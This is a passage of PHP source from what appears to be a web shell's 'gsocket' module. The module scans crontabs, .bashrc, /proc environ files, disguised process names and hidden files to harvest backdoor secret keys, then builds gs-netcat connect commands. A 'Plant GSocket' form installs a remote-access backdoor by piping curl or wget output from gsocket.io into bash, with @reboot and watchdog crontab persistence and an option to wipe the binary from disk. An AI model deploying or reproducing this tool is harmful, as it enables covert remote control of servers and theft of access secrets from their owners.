                $gs_action_bg = '#FFF8F8'; $gs_action_brd = '#CC3333';
            }
        }
        $rescan  = isset($_POST['gs_rescan']);
        $do_cron = !$rescan || isset($_POST['gs_cron']);
        $do_proc = !$rescan || isset($_POST['gs_proc']);
        $do_env  = !$rescan || isset($_POST['gs_env']);
        $do_disk = !$rescan || isset($_POST['gs_disk']);
        $do_log  = !$rescan || isset($_POST['gs_log']);
        $gres = array(); $gseen = array();
        $gsme   = $gsr('whoami') ?: 'www-data';
        $gshome = $gsr('echo ~');
        // Extract gsocket keys from text — all known formats:
        // -s KEY, S="KEY", S='KEY', SS_SECRET=KEY
        $gs_keys = function($text) {
            $out = [];
            preg_match_all('/-s\s+["\']?([A-Za-z0-9_\-]{8,})["\']?/', $text, $m); foreach ($m[1] as $v) $out[] = trim($v, '"\'');
            preg_match_all('/\bS=["\']([^"\']{8,})["\']/', $text, $m);              foreach ($m[1] as $v) $out[] = $v;
            preg_match_all('/SS_SECRET=([A-Za-z0-9_\-]{8,})/', $text, $m);         foreach ($m[1] as $v) $out[] = $v;
            return array_unique(array_filter($out));
        };
        // Read key from a gsocket -k keyfile (plain text, one line)
        $gs_read_dat = function($path) {
            $k = @file_get_contents($path);
            if ($k === false || $k === '') return '';
            $k = trim($k);
            return preg_match('/^[A-Za-z0-9_\-]{8,64}$/', $k) ? $k : '';
        };
        // Decode base64 blobs in crontab and extract key via -k file or plain patterns
        $gs_b64_cron = function($text) use ($gs_keys, $gs_read_dat) {
            $found = array();
            preg_match_all('/echo\s+([A-Za-z0-9+\/=]{40,})\s*\|[^|]*base64\s*-d/', $text, $bm);
            foreach ($bm[1] as $b64) {
                $dec = @base64_decode($b64, true);
                if (!$dec) continue;
                if (preg_match('/-k\s+(\S+)/', $dec, $dm)) {
                    $k = $gs_read_dat($dm[1]);
                    if ($k) $found[] = array('key'=>$k, 'detail'=>$dm[1].' (crontab b64 -k)');
                }
                foreach ($gs_keys($dec) as $k) $found[] = array('key'=>$k, 'detail'=>'crontab b64-decoded');
            }
            return $found;
        };
        // 1. Crontab + ~/.bashrc (gsocket.io installer writes to both)
        if ($do_cron) {
            $cout = $gsr('crontab -l');
            foreach ($gs_keys($cout) as $k) {
                if (!isset($gseen[$k])) { $gseen[$k]=1; $gres[]=array('src'=>'crontab','key'=>$k,'user'=>$gsme,'detail'=>'crontab -l','pid'=>''); }
            }
            foreach ($gs_b64_cron($cout) as $e) {
                if (!isset($gseen[$e['key']])) { $gseen[$e['key']]=1; $gres[]=array('src'=>'crontab','key'=>$e['key'],'user'=>$gsme,'detail'=>$e['detail'],'pid'=>''); }
            }
            $brc = @file_get_contents("$gshome/.bashrc");
            if ($brc) foreach ($gs_keys($brc) as $k) {
                if (!isset($gseen[$k])) { $gseen[$k]=1; $gres[]=array('src'=>'crontab','key'=>$k,'user'=>$gsme,'detail'=>"$gshome/.bashrc",'pid'=>''); }
            }
            foreach (array('/var/spool/cron/crontabs', '/var/spool/cron') as $cd) {
                foreach ((glob("$cd/*") ?: array()) as $cf) {
                    if (!is_file($cf) || !is_readable($cf)) continue;
                    $cu = basename($cf); $cc = @file_get_contents($cf);
                    if ($cc) {
                        foreach ($gs_keys($cc) as $k) {
                            if (!isset($gseen[$k])) { $gseen[$k]=1; $gres[]=array('src'=>'crontab','key'=>$k,'user'=>$cu,'detail'=>$cf,'pid'=>''); }
                        }
                        foreach ($gs_b64_cron($cc) as $e) {
                            if (!isset($gseen[$e['key']])) { $gseen[$e['key']]=1; $gres[]=array('src'=>'crontab','key'=>$e['key'],'user'=>$cu,'detail'=>$e['detail'],'pid'=>''); }
                        }
                    }
                }
            }
        }
        // 2. Process list (hidden gsocket process names)
        if ($do_proc) {
            $pg = $gsr("pgrep -a -E 'kstrp|watchdogd|ksmd|kswapd0|mm_percpu_wq|id_rsa|slub_flushwq|kthreadd|rcu_sched|khugepaged|kdevtmpfs|deferwq|defunct'");
            foreach (explode("\n", $pg) as $line) {
                $line = trim($line); if (!$line) continue;
                $p = explode(' ', $line, 2); $pid = $p[0];
                if (!ctype_digit($pid)) continue;
                $k = $gsr("tr '\\000' '\\n' < /proc/$pid/environ | grep -oP 'SS_SECRET=\\K\\S+'");
                if (!$k || isset($gseen[$k])) continue;
                $gseen[$k]=1; $pname = isset($p[1]) ? $p[1] : '';
                $gres[]=array('src'=>'process','key'=>$k,'user'=>$gs_pu($pid),'detail'=>"PID $pid - $pname",'pid'=>$pid);
            }
        }
        // 3. /proc/environ scan — SS_SECRET and GS_ARGS=-k keyfile
        if ($do_env) {
            foreach (array('SS_SECRET', 'GS_ARGS') as $gsenv) {
                $rl = $gsr("grep -ral '$gsenv' /proc/*/environ");
                foreach (explode("\n", $rl) as $ef) {
                    $ef = trim($ef);
                    if (!preg_match('#/proc/(\d+)/environ#', $ef, $epm)) continue;
                    $pid = $epm[1];
                    if ($gsenv === 'SS_SECRET') {
                        $k = $gsr("tr '\\000' '\\n' < /proc/$pid/environ | grep -oP 'SS_SECRET=\\K\\S+'");
                        if (!$k || isset($gseen[$k])) continue;
                        $gseen[$k]=1;
                        $gres[]=array('src'=>'/proc/env','key'=>$k,'user'=>$gs_pu($pid),'detail'=>"PID $pid",'pid'=>$pid);
                    } else {
                        // GS_ARGS="-k /path/to/file.dat ..." — read key from file
                        $gsa = $gsr("tr '\\000' '\\n' < /proc/$pid/environ | grep '^GS_ARGS='");
                        if (!$gsa || !preg_match('/-k\s+(\S+)/', $gsa, $dm)) continue;
                        $k = $gs_read_dat($dm[1]);
                        if (!$k || isset($gseen[$k])) continue;
                        $gseen[$k]=1;
                        $gres[]=array('src'=>'/proc/env','key'=>$k,'user'=>$gs_pu($pid),'detail'=>"PID $pid GS_ARGS keyfile ".$dm[1],'pid'=>$pid);
                    }
                }
            }
        }
        // 4. Disk binary + .dat keyfiles
        if ($do_disk) {
            $ssh    = escapeshellarg("$gshome/.ssh");
            $cfg    = escapeshellarg("$gshome/.config");
            // Binaries: defunct / .gs / gs-netcat in standard hidden dirs AND ~/.config/
            $fd = $gsr("find /tmp /dev/shm /var/tmp $ssh $cfg -maxdepth 5 \\( -name 'defunct' -o -name '.gs' -o -name 'gs-netcat' -o -name 'id_rsa' \\) -type f 2>/dev/null");
            foreach (explode("\n", $fd) as $fp) {
                $fp = trim($fp); if (!$fp || !file_exists($fp)) continue;
                $k = $gsr('strings ' . escapeshellarg($fp) . " | grep -oP '(?<=-s )\\S+' | head -1");
                if (!$k || isset($gseen[$k])) continue;
                $owner = $gsr("stat -c '%U' " . escapeshellarg($fp));
                $pid   = $gsr('pgrep -f ' . escapeshellarg(basename($fp)) . ' | head -1');
                $ru    = ($pid && ctype_digit($pid)) ? $gs_pu($pid) : ($owner ?: '?');
                $gseen[$k]=1;
                $gres[]=array('src'=>'disk','key'=>$k,'user'=>$ru,'detail'=>$fp.($pid?" (PID $pid)":''),'pid'=>($pid ?: ''));
            }
            // .dat keyfiles (gsocket -k format: key stored as plain text in file)
            $fd2 = $gsr("find /tmp /dev/shm $cfg -maxdepth 5 -name '*.dat' -type f 2>/dev/null");
            foreach (explode("\n", $fd2) as $fp) {
                $fp = trim($fp); if (!$fp) continue;
                $k = $gs_read_dat($fp);
                if (!$k || isset($gseen[$k])) continue;
                $owner = $gsr("stat -c '%U' " . escapeshellarg($fp));
                $gseen[$k]=1;
                $gres[]=array('src'=>'disk','key'=>$k,'user'=>($owner ?: $gsme),'detail'=>$fp.' (keyfile)','pid'=>'');
            }
        }
        // 5. Log files
        if ($do_log) {
            foreach (array('/tmp/.gs_install.log','/tmp/.gs_py.log','/tmp/.gs.log',"$gshome/.gs_session.log","$gshome/.gsocket",'/tmp/.gsocket') as $lf) {
                if (!@file_exists($lf) || !is_readable($lf)) continue;
                $lc = @file_get_contents($lf); if (!$lc) continue;
                $owner = $gsr("stat -c '%U' " . escapeshellarg($lf));
                preg_match_all('/(?:gs-netcat -s "([^"]+)"|SS_SECRET=(\S+))/', $lc, $lm);
                foreach (array_filter(array_merge($lm[1], $lm[2])) as $k) {
                    if (!isset($gseen[$k])) { $gseen[$k]=1; $gres[]=array('src'=>'logs','key'=>$k,'user'=>($owner ?: '?'),'detail'=>$lf,'pid'=>''); }
                }
            }
        }
        // Liveness check
        foreach ($gres as &$gr) {
            if (!$gr['key']) { $gr['live']=false; continue; }
            if ($gr['pid'] && ctype_digit((string)$gr['pid'])) {
                $gr['live'] = file_exists('/proc/' . (int)$gr['pid']);
            } else {
                $fl = $gsr('grep -ral ' . escapeshellarg('SS_SECRET='.$gr['key']) . ' /proc/*/environ');
                preg_match('#/proc/(\d+)/environ#', $fl, $lpm);
                $fpid = isset($lpm[1]) ? $lpm[1] : '';
                $gr['live'] = ($fpid && file_exists('/proc/' . (int)$fpid));
                if ($fpid) $gr['pid'] = $fpid;
            }
        }
        unset($gr);
        // Stats
        $gnk = count(array_filter($gres, function($r){ return (bool)$r['key']; }));
        $gnr = count(array_filter($gres, function($r){ return $r['user']==='root' && $r['key']; }));
        $gnl = count(array_filter($gres, function($r){ return $r['live']; }));
        // Status bar
        $gsm = 'Scan complete &mdash; <b>' . $gnk . ' key' . ($gnk!=1?'s':'') . ' found</b> (' . $gnl . ' live)';
        if ($gnr) $gsm .= ' &nbsp;|&nbsp; <span style="color:#CC0000;font-weight:bold;">&#9888; ' . $gnr . ' running as ROOT</span>';
        if ($gs_action_msg) {
            echo '<div class="msgbox">' . $gs_action_msg . '</div>';
            echo '<div class="actall" style="text-align:left;padding:4px 8px;background:' . $gs_action_bg . ';border-bottom:1px solid ' . $gs_action_brd . '">';
            echo '<code style="font-size:11px;">' . nl2br(htmlspecialchars($gs_action_out)) . '</code></div>';
        } else {
            echo '<div class="msgbox">' . $gsm . '</div>';
        }
        // Re-scan form
        echo '<form method="POST">'; subeval();
        echo '<input type="hidden" name="go" value="gsocket">';
        echo '<input type="hidden" name="gs_rescan" value="1">';
        echo '<div class="actall">Sources:&nbsp; ';
        $gschk = function($n,$l,$i) use ($rescan) {
            $c = (!$rescan || isset($_POST[$n])) ? ' checked' : '';
            echo "<input type='checkbox' name='$n' id='$i'$c> <label for='$i'>$l</label> &nbsp;";
        };
        $gschk('gs_cron','Crontab','gck1'); $gschk('gs_proc','Process list','gck2');
        $gschk('gs_env','/proc/environ','gck3'); $gschk('gs_disk','Disk binary','gck4');
        $gschk('gs_log','Log files','gck5');
        echo '&nbsp;<input type="submit" value="Scan All" style="width:68px"></div></form>';
        // Results table
        if (!$gnk) {
            echo '<div class="actall">No gsocket keys found.</div>';
            // Debug section — shows raw output of every scan command
            $gs_dbg = array(
                'whoami / echo ~'            => $gsr('whoami') . ' | home=' . $gshome,
                'crontab -l'                 => $gsr('crontab -l') ?: '(empty)',
                'cat ~/.bashrc | grep -iE SS_SECRET\|gs-netcat\|S=' => $gsr("cat " . escapeshellarg("$gshome/.bashrc") . " 2>/dev/null | grep -iE 'SS_SECRET|gs-netcat|S='") ?: '(not found)',
                'grep -ral SS_SECRET /proc/*/environ' => $gsr('grep -ral SS_SECRET /proc/*/environ') ?: '(empty — no permission or no process)',
                'pgrep -a -E defunct|slub|kstrp|watchdog|ksmd' => $gsr("pgrep -a -E 'defunct|slub_flushwq|kstrp|watchdogd|ksmd'") ?: '(empty)',
                'ls -la /tmp/.gs* /tmp/.gsocket ~/.gsocket 2>&1' => $gsr("ls -la /tmp/.gs* /tmp/.gsocket " . escapeshellarg("$gshome/.gsocket") . " 2>&1") ?: '(nothing found)',
                'cat /var/spool/cron/crontabs/* (if readable)' => $gsr('cat /var/spool/cron/crontabs/* 2>/dev/null || cat /var/spool/cron/* 2>/dev/null') ?: '(not readable)',
            );
            echo '<div class="actall" style="text-align:left;padding:6px 10px;">';
            echo '<b style="color:#8B0000;">Debug output (0 keys found — paste this to diagnose):</b>';
            foreach ($gs_dbg as $cmd => $out) {
                echo '<br><code style="font-size:11px;color:#444;">$ ' . htmlspecialchars($cmd) . '</code>';
                echo '<pre style="background:#F0F0F0;border:1px solid #CCC;font-size:11px;padding:4px 6px;margin:2px 0 6px;overflow-x:auto;white-space:pre-wrap;">' . htmlspecialchars(trim($out)) . '</pre>';
            }
            echo '</div>';
        } else {
            $gsc = array(
                'crontab'   => 'background:#FFF3CC;color:#8B6000;border:1px solid #CCAA00',
                '/proc/env' => 'background:#CCF0FF;color:#004080;border:1px solid #0080CC',
                'process'   => 'background:#E8F4E8;color:#006000;border:1px solid #00A000',
                'disk'      => 'background:#CCE8FF;color:#003070;border:1px solid #0060BB',
                'logs'      => 'background:#EEEEEE;color:#555;border:1px solid #999',
            );
            echo '<table class="tables"><tr>';
            echo '<th style="width:22px;">#</th><th style="width:82px;">Source</th><th>SS_SECRET key</th>';
            echo '<th style="width:72px;">User</th><th style="width:175px;">Binary / PID</th>';
            echo '<th style="width:55px;">Status</th><th style="width:92px;">Action</th></tr>';
            $gn = 0;
            foreach ($gres as $gr) {
                if (!$gr['key']) continue; $gn++;
                $ir = ($gr['user'] === 'root');
                $ss = isset($gsc[$gr['src']]) ? $gsc[$gr['src']] : '';
                $sh = '<span style="display:inline-block;padding:1px 5px;font-size:11px;font-weight:bold;font-family:\'Courier New\',monospace;' . $ss . '">' . htmlspecialchars($gr['src']) . '</span>';
                $uh = $ir ? '<span style="color:#CC0000;font-weight:bold;font-family:\'Courier New\',monospace;">&#9888; root</span>' : '<code style="font-size:11px;">' . htmlspecialchars($gr['user']) . '</code>';
                $kh = $gr['live'] ? '<code>' . htmlspecialchars($gr['key']) . '</code>' : '<code><s>' . htmlspecialchars($gr['key']) . '</s></code>';
                $lh = $gr['live'] ? '<span style="color:#008B00;font-weight:bold;">&#9679; Live</span>' : '<span style="color:#CC0000;font-weight:bold;">&#10005; Stale</span>';
                $rb = $ir ? ' style="background:#FFE0E0;"' : '';
                $ke = addslashes($gr['key']);
                echo "<tr$rb><td>$gn</td><td>$sh</td><td>$kh</td><td>$uh</td>";
                echo '<td><code style="font-size:11px;">' . htmlspecialchars($gr['detail']) . '</code></td>';
                echo "<td>$lh</td><td>";
                echo "<input type='button' value='Copy' style='width:36px' onclick=\"gscp('$ke')\">";
                if ($gr['live']) echo " <input type='button' value='CMD' style='width:36px' onclick=\"gscmd('$ke')\">";
                echo '</td></tr>';
            }
            echo '</table>';
        }
        // Connect command bar
        echo '<div id="gs_cmdbar" style="display:none;" class="actall"><b>Connect command:</b> &nbsp;';
        echo '<code id="gs_cmd" style="font-family:\'Courier New\',monospace;background:#F0F0F0;border:1px solid #999;padding:2px 6px;"></code>';
        echo ' &nbsp;<input type="button" value="Copy CMD" style="width:72px" onclick="gscp(document.getElementById(\'gs_cmd\').textContent)"></div>';
        // JS helpers
        echo '<script>';
        echo 'function gscp(k){if(navigator.clipboard)navigator.clipboard.writeText(k);}';
        echo 'function gscmd(k){var b=document.getElementById("gs_cmdbar"),c=document.getElementById("gs_cmd");c.textContent=\'gs-netcat -s "\'+k+\'" -i\';b.style.display="block";}';
        echo '</script>';
        // Plant GSocket table (Variant C — always shown at bottom)
        $gspk     = htmlspecialchars($gs_plant_key);
        $pmcurl   = (!isset($_POST['gs_method']) || $_POST['gs_method'] === 'curl')   ? ' checked' : '';
        $pmwget   = (isset($_POST['gs_method'])  && $_POST['gs_method'] === 'wget')    ? ' checked' : '';
        $pmnohup  = (isset($_POST['gs_method'])  && $_POST['gs_method'] === 'nohup')  ? ' checked' : '';
        $ppreboot = (!isset($_POST['gs_plant']) && !isset($_POST['gs_remove'])) || isset($_POST['gs_persist_reboot']) ? ' checked' : '';
        $ppwatch  = (!isset($_POST['gs_plant']) && !isset($_POST['gs_remove'])) || isset($_POST['gs_persist_watch'])  ? ' checked' : '';
        $pprmbin  = isset($_POST['gs_rm_bin']) ? ' checked' : '';
        echo '<form method="POST">'; subeval();
        echo '<input type="hidden" name="go" value="gsocket">';
        echo '<table class="tables" style="border-top:2px solid #999999">';
        echo '<tr style="background:#EEE685"><td colspan="2"><b>Plant GSocket</b></td></tr>';
        echo '<tr><td style="width:26%">Key (SS_SECRET)</td><td>';
        echo '<input type="text" name="gs_key" id="gspkey" value="' . $gspk . '" placeholder="leave blank to auto-generate" style="width:220px;font-family:\'Courier New\',monospace">';
        echo ' &nbsp;<input type="button" value="Random" style="width:54px" onclick="var c=\'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789\',s=\'\';for(var i=0;i<20;i++)s+=c[Math.floor(Math.random()*c.length)];document.getElementById(\'gspkey\').value=s">';
        echo '</td></tr>';
        echo '<tr><td>Install method</td><td>';
        echo '<label><input type="radio" name="gs_method" value="curl"' . $pmcurl . '> curl &nbsp;<code style="font-size:11px;color:#555">S="KEY" bash -c "$(curl -fsSL https://gsocket.io/y)"</code></label><br>';
        echo '<label><input type="radio" name="gs_method" value="wget"' . $pmwget . '> wget &nbsp;<code style="font-size:11px;color:#555">S="KEY" bash -c "$(wget -qO- https://gsocket.io/y)"</code></label><br>';
        echo '<label><input type="radio" name="gs_method" value="nohup"' . $pmnohup . '> nohup (binary already on disk) &nbsp;<code style="font-size:11px;color:#555">SS_SECRET="KEY" nohup defunct -liqD &amp;</code></label>';
        echo '</td></tr>';
        echo '<tr><td>Persistence</td><td>';
        echo '<label><input type="checkbox" name="gs_persist_reboot"' . $ppreboot . '> @reboot crontab</label> &nbsp;&nbsp;';
        echo '<label><input type="checkbox" name="gs_persist_watch"' . $ppwatch . '> watchdog crontab (*/5 * * * *)</label> &nbsp;&nbsp;';
        echo '<label><input type="checkbox" name="gs_rm_bin"' . $pprmbin . '> also delete binary/keyfile from disk</label>';
        echo '</td></tr>';
        echo '<tr><td>Action</td><td>';
        echo '<input type="submit" name="gs_plant" value="Plant" style="width:68px">';
        echo ' &nbsp;<input type="submit" name="gs_remove" value="Remove" style="width:68px">';
        echo ' &nbsp;<span style="color:#666;font-size:11px">Remove: kills process + wipes crontab entries matching the key above</span>';
        echo '</td></tr>';
        echo '</table></form>';
        break;
}
break;
}
?>
<div class="footag"><?php 
echo php_uname() . '<br>' . $_SERVER['SERVER_SOFTWARE'];
?>
</div></div></div></body></html><?php 
unset($array);

